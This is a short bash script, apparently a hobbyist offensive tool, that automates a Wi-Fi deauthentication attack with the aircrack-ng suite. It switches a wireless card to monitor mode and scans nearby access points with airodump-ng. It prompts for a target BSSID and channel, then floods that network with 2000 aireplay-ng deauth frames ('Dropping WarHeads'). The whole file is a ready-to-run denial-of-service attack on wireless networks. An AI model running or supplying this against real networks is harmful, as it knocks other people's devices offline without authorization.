#!/bin/bash

##Author : Paranoid Ninja
##Email : paranoidninja@protonmail.com

ifconfig wlan1 up
src_mac=`ifconfig wlan1 | awk '/ether/ {print $2}'`
ifconfig wlan1 down
iwconfig wlan1 mode monitor
airodump-ng wlan1 -w tempdump
trap ctrl_c INT
clear
echo -e "[-][-][-] Select Your Target or Type 'q' to Holster::\n"
cat tempdump-01.csv | awk -F "," '{ print $1$4$14 }' | sed -n '/BSSID/!p' | sed -n '/Station/q;p' | sed '/^\s*$/d' | nl;echo ''
read -e -p ">>> " -n3 tempmacid
if [[ $tempmacid == 'q' ]]; then
	ifconfig wlan1 down
	iwconfig wlan1 mode managed
	rm tempdump*
	clear
	exit
else
	mac_id=`cat tempdump-01.csv | awk -F "," '{ print $1$14 }' | sed -n '/BSSID/!p' | sed -n '/Station/q;p' | sed '/^\s*$/d' | awk 'NR=="'$tempmacid'"{ print $1 }'`
	echo -e ""
	rm tempdump*
	read -e -p "Enter Channel>>> " -n3 chnl; echo -e ''
	if [[ $chnl == 'q' ]]; then
	        ifconfig wlan1 down
	        iwconfig wlan1 mode managed
	        clear
		exit
	else
		ifconfig wlan1 down
		iwconfig wlan1 mode monitor
		ifconfig wlan1 up
		iwconfig wlan1 channel $chnl
		echo -e "Dropping WarHeads...\n"
		aireplay-ng --deauth 2000 -a $mac_id -h $src_mac wlan1 --ignore-negative-one
		trap ctrl_c INT
		ifconfig wlan1 down
		iwconfig wlan1 mode managed
		ifconfig wlan1 up
		clear
	fi;
fi;
